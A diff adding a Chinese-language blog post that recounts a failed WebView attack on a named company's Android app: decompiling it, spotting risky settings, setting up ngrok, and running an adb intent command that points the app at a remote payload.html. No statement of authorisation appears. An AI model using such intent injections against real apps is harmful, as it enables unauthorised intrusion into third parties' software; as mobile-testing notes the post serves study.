@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Webview Attacks | HackThe4O4</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="failed attack process來說說webview的採坑過程，原本以為有洞，結果後來發現.. 目標是某個公司的apk，通過jadx-gui把apk的所有程式挖出來 Android WebView 是 Android 作業系統 (OS) 的系統元件，可讓 Android 應用程式直接在應用程式內顯示來自 Web 的內容。  WebView 應用程式主要由 Javascript、CSS 和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webview Attacks">
+<meta property="og:url" content="https://no-flag.com/2024/03/31/webview/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="failed attack process來說說webview的採坑過程，原本以為有洞，結果後來發現.. 目標是某個公司的apk，通過jadx-gui把apk的所有程式挖出來 Android WebView 是 Android 作業系統 (OS) 的系統元件，可讓 Android 應用程式直接在應用程式內顯示來自 Web 的內容。  WebView 應用程式主要由 Javascript、CSS 和">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://no-flag.com/img/webview.png">
+<meta property="og:image" content="https://no-flag.com/img/webview1.png">
+<meta property="og:image" content="https://no-flag.com/img/webview2.png">
+<meta property="og:image" content="https://no-flag.com/img/webview3.png">
+<meta property="og:image" content="https://no-flag.com/img/webview4.png">
+<meta property="og:image" content="https://no-flag.com/img/webview5.png">
+<meta property="og:image" content="https://no-flag.com/img/webview6.png">
+<meta property="og:image" content="https://no-flag.com/img/webview7.png">
+<meta property="og:image" content="https://no-flag.com/img/webview8.png">
+<meta property="article:published_time" content="2024-03-31T08:11:44.975Z">
+<meta property="article:modified_time" content="2024-03-31T08:17:28.875Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://no-flag.com/img/webview.png">
+  
+    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/cat.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/mela.gif" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/2024/03/04/hello-world/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/mela.gif" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/2024/03/04/hello-world/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-webview" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/03/31/webview/" class="article-date">
+  	<time datetime="2024-03-31T08:11:44.975Z" itemprop="datePublished">2024-03-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Webview Attacks
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="failed-attack-process"><a href="#failed-attack-process" class="headerlink" title="failed attack process"></a>failed attack process</h3><p>來說說webview的採坑過程，原本以為有洞，結果後來發現..</p>
+<p>目標是某個公司的apk，通過jadx-gui把apk的所有程式挖出來</p>
+<p>Android WebView 是 Android 作業系統 (OS) 的系統元件，可讓 Android 應用程式直接在應用程式內顯示來自 Web 的內容。 </p>
+<p>WebView 應用程式主要由 Javascript、CSS 和 HTML 檔案組成。基本上，該應用程式是一個或多個網頁。這些網頁構成了您的前端介面。</p>
+<p>如果開發人員想要為應用程式新增瀏覽器功能，他&#x2F;她可以包含 WebView 庫並建立 WebView 類別的實例；這本質上是在應用程式中嵌入了一個瀏覽器來執行渲染網頁和執行 JavaScript 等操作。</p>
+<p>首先，通過弱掃發現了Remote WebView debugging是開啟的狀態</p>
+<p>Remote WebView debugging is enabled. 	</p>
+<p>high 	CWE: CWE-919: Weaknesses in Mobile Applications<br>OWASP Top 10: M1: Improper Platform Usage<br>OWASP MASVS: MSTG-RESILIENCE-2 	</p>
+<p>tw&#x2F;net&#x2F;sun&#x2F;fudon&#x2F;water&#x2F;MainActivity.java</p>
+<p>先找到及確認該功能為啟用</p>
+<p>確認了webview 功能啟用且引用了該功能</p>
+<p><img src="/img/webview.png" alt="Untitled"></p>
+<p>Webview Inten 方案，如果管理不慎可能導致利用漏洞，可能導致XSS攻擊</p>
+<p>查看有權限的componer路徑，有權限訪問才能查看到路徑</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**adb shell dumpsys package | grep tw.net.sun.fudon**</span><br><span class="line">        1283ffd tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</span><br><span class="line">        1283ffd tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</span><br></pre></td></tr></table></figure>
+
+<p>setJavaScriptEnabled(true);</p>
+<ul>
+<li>這將允許 webview 在 webview 中運行 javascript。通常用於提供網站的完整功能，但可以被利用</li>
+<li>未經適當保護啟用JavaScript可能會引入安全漏洞</li>
+</ul>
+<p><img src="/img/webview1.png" alt="Untitled"></p>
+<ul>
+<li><strong>enableRemoteDebugging() 啟用 WebView 的遠端偵錯功能</strong><ul>
+<li>在生產環境中啟用了遠端偵錯功能，可能會為攻擊者提供額外的攻擊面</li>
+<li>攻擊者可以利用遠端偵錯功能來竊取敏感資訊、執行惡意程式碼等</li>
+<li>建議在生產環境中停用遠端調試功能</li>
+<li>可以透過在啟動應用程式時檢查建置類型或設定檔中的標誌來控制是否啟用遠端偵錯功能</li>
+</ul>
+</li>
+<li><strong>exposeJsInterface()</strong><ul>
+<li>WebView 中暴露一個 JavaScript 接口，使得 JavaScript 程式碼可以呼叫該接口中的方法</li>
+<li>這種操作可能存在安全風險，特別是如果不正確地處理暴露的接口，可能導致遠端程式碼執行漏洞或其他安全問題</li>
+<li>建議仔細審查和驗證暴露的接口，確保只有受信任的程式碼可以調用，並且避免直接將敏感資料暴露給 JavaScript</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/webview2.png" alt="Untitled"></p>
+<p>Remote WebView debugging is enabled</p>
+<ul>
+<li>開啟遠端 WebView 偵錯可能會使應用程式容易受到攻擊，尤其是在生產環境中</li>
+<li>攻擊者可以利用遠端 WebView 偵錯來查看應用程式的原始程式碼、注入惡意腳本、竊取敏感資訊等</li>
+<li>確保在生產版本中停用 WebView 的遠端偵錯功能，可以在應用程式的啟動或配置過程中進行設定</li>
+</ul>
+<p>intent.getStringExtra(“url”) </p>
+<ul>
+<li>這會將 extra 的值（此處為 url）儲存到新的字串 url 中</li>
+<li>這邊會關乎到能否去利用webview啟用狀態而進行exploit</li>
+</ul>
+<p><img src="/img/webview3.png" alt="Untitled"></p>
+<p><img src="/img/webview4.png" alt="Untitled"></p>
+<p>但是，看到這邊AndroidManifest.xml裡面的紀錄，</p>
+<p>android:exported&#x3D;”False” 不能注入了QQ</p>
+<p>如果是true，就能進行攻擊了，也就是前面的分析白費，這邊沒啟用就是利用不了</p>
+<p><img src="/img/webview5.png" alt="Untitled"></p>
+<p>可以稍微說下，當初在看程式的時候，看到在這邊是啟用的狀態，覺得很興奮，以為有料能進行利用了</p>
+<p><img src="/img/webview6.png" alt="Untitled"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme.NoActionBarLaunch&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_main&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;tw.net.sun.fudon.water.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;portrait&quot;</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;smallestScreenSize|screenSize|uiMode|screenLayout|orientation|keyboardHidden|keyboard|locale&quot;</span> <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以就去測試了一下，指令如下</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove --purge apache2 apache2-utils</span><br><span class="line">sudo apt-get install --reinstall apache2 apache2-utils</span><br><span class="line">sudo service apache2 start</span><br><span class="line">sudo service apache2 status</span><br><span class="line"></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# ngrok http <span class="number">80</span></span><br><span class="line"><span class="title class_">Usage</span> <span class="keyword">of</span> ngrok requires a verified account and authtoken.</span><br><span class="line"></span><br><span class="line"><span class="title class_">Sign</span> up <span class="keyword">for</span> an <span class="attr">account</span>: <span class="attr">https</span>:<span class="comment">//dashboard.ngrok.com/signup  到官網註冊後會產生以下指令，輸入即可</span></span><br><span class="line"><span class="title class_">Install</span> your <span class="attr">authtoken</span>: <span class="attr">https</span>:<span class="comment">//dashboard.ngrok.com/get-started/your-authtoken</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">ERR_NGROK_4018</span></span><br><span class="line"></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# **ngrok config add-authtoken 2eJvh3PifjXXXXXXXXXXXXXXXXCgLXVK74**</span><br><span class="line"><span class="title class_">Authtoken</span> saved to configuration <span class="attr">file</span>: <span class="regexp">/root/</span>.<span class="property">config</span>/ngrok/ngrok.<span class="property">yml</span></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# ngrok http <span class="number">80</span></span><br><span class="line"></span><br><span class="line">and use **https ngrok link</span><br><span class="line">記得payload.<span class="property">html</span>要放在ngrok啟用的目錄下**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/webview7.png" alt="Untitled"></p>
+<blockquote>
+<p>adb shell am start -n componentname –es string “<a target="_blank" rel="noopener" href="http://domain.com/">domain.com</a>“</p>
+</blockquote>
+<p>componentname 是前面通過 <strong>adb shell dumpsys package</strong> 然後列出的package路徑，如果你的android:exported&#x3D;”True”，就能看到路徑列出，甚至進行利用</p>
+<p>前面列出的路徑是<code>tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</code></p>
+<p><code>--es</code> 後面接的是intent.getStringExtra裡面塞的東西</p>
+<p>所以指令這樣下</p>
+<p><code>adb shell am start -n tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity --es url &quot; [https://c5b7-210-242-228-139.ngrok-free.app](https://c579-59-120-78-233.ngrok-free.app/)/payload.html&quot;</code></p>
+<p><img src="/img/webview8.png" alt="Untitled"></p>
+<p>但沒有反應，雖然啟動了APP，但重點是因為 <code>tw.net.sun.fudon.water.MainActivity</code> 這邊 <code>android:exported=”False”</code>，所以exploit就失敗了&#x3D;.&#x3D;</p>
+<p>總結來說，有點可惜，因為他很多設置都是啟用狀態，但真的要好好注意 <code>android:exported</code> 是不是 <code>true</code> ，不然會浪費太多時間在測試它，再加上現在Android的版本太高了，導致很多漏洞利用變得困難</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/03/26/SCIST_final/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SCIST Final exam</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 Noflag
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
